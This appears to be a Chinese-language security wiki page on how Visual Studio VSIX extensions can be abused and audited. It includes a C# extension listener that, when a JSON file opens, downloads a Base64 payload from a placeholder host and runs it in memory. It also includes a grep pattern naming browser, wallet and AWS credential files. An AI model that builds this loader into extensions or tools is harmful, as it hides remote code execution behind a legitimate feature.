# Visual Studio VSIX 扩展滥用

{{#include ../banners/hacktricks-training.md}}

Visual Studio 扩展可以将日常编辑器活动变成以已登录用户身份执行代码的机会。恶意 VSIX、仿冒发布者或遭入侵的扩展更新，都可以通过正常安装渠道触达用户。需要管理员提示的安装是经过用户同意的安装途径，并不意味着会自动提权。<sup>[[1]](#references)</sup>

## 执行模型

传统的 VSSDK 扩展通常在 `devenv.exe` 中执行。较新的 `VisualStudio.Extensibility` 模型主要让现代 .NET 扩展在进程外运行：Visual Studio 会将调用交由专用的 `Microsoft.ServiceHub.Host.Extensibility` 进程处理，从而隔离对 IDE 稳定性的影响，**但不会**将扩展与用户的 Windows 权限隔离。可执行文件名可能包含架构后缀，例如 `ServiceHub.Host.Extensibility.arm64.exe`。<sup>[[1]](#references)[[2]](#references)</sup>

### 在常规编辑器活动中触发

扩展不必只提供醒目的菜单命令，也可以实现 `ITextViewOpenClosedListener`。对于匹配的文档，会调用其 `TextViewOpenedAsync` 回调，而 `TextViewExtensionConfiguration.AppliesTo` 可以将激活范围限制为 JSON 等常见类型。即使真实的格式化工具或 linter 执行了其宣传的功能，打开文件时也可以同时触发第二个副作用操作。<sup>[[1]](#references)[[3]](#references)</sup>

以下精简模式展示了关键执行点；为便于说明，其中省略了合法的格式化工具和错误处理。<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>事件触发的内存中托管程序集加载器</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

这条链会下载 Base64 文本，将其解码为 assembly 字节，通过可回收的 `AssemblyLoadContext` 从 `MemoryStream` 加载，并使用反射调用 `EntryPoint`，传入空参数或 `string[]`；它还会等待异步入口点完成，然后卸载该上下文。第二阶段不会写入磁盘，但 VSIX 和主扩展 DLL 仍会留在磁盘上。Base64 不提供真实性或机密性；使用 HTTP 还会允许路径上的攻击者替换响应。<sup>[[1]](#references)</sup>

操作上的变体包括抑制所有异常，以便在暂存失败时宣传的功能仍能继续运行；或者使用 `ITextViewChangedListener` 在编辑后触发。代码在扩展宿主中执行，可以使用该用户可用的托管 API、P/Invoke、文件、凭据和子进程。<sup>[[1]](#references)</sup>

如需了解基于原生插件自动加载的相关编辑器专属执行面，请参阅：

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace 和分发信任滥用

VSIX 可以作为直接分享或钓鱼文件、从 Web Marketplace 获取，或通过 Visual Studio 内嵌的 Marketplace 浏览器获取。发布者注册机制主要用于确保名称唯一并限制保留词，因此可能允许容易造成视觉混淆的发布者身份；攻陷已获信任的发布者或扩展则更有效，因为它们已有安装用户群。通过 Marketplace 安装时会调用 Visual Studio Installer，并将下载的 VSIX 临时放在 `%LOCALAPPDATA%\Temp` 下；`payload.vsix` 也会被合法使用，因此文件名本身并不是判断指标。<sup>[[1]](#references)</sup>

MDSec 没有发现可直接安装扩展的 Visual Studio URL 协议。操作者仍需让用户安装并信任 VSIX，或者攻陷现有扩展的分发路径。`AllUsers` 包会安装到 Visual Studio 安装文件夹下，并可能请求提升权限，但这是需要用户同意的常规安装程序行为，并非自动获得管理员或 SYSTEM 权限的途径。<sup>[[1]](#references)[[4]](#references)</sup>

### 大规模静态审计

VSIX 包通常是 ZIP 容器，因此安全的 Marketplace 审查流程可以枚举软件包、**不加载扩展代码**地解包、解析清单、识别可执行面，并使用 `ilspycmd` 反编译托管程序集。排除常见的捆绑依赖后，应优先检查扩展自有程序集，然后将凭据存储相关字符串与行为组合关联起来，例如文件读取加网络发送、编码加发送、下载加执行、凭据管理器加网络访问，或截图加发送。<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

同时清点原生 DLL、MSBuild targets、脚本、T4 模板和安装程序载荷，不要假设所有执行面都属于托管代码。将可疑行为与清单声称的用途进行对比；遥测和合法的更新程序可能看起来像 exfiltration 或 staging。仅进行静态审查会遗漏已打包、混淆、动态解析和休眠的代码；只审查最新版本则会漏掉历史版本中的恶意发布。<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio 扩展再探](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - 关于 VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX 包的组成](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET 工具](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
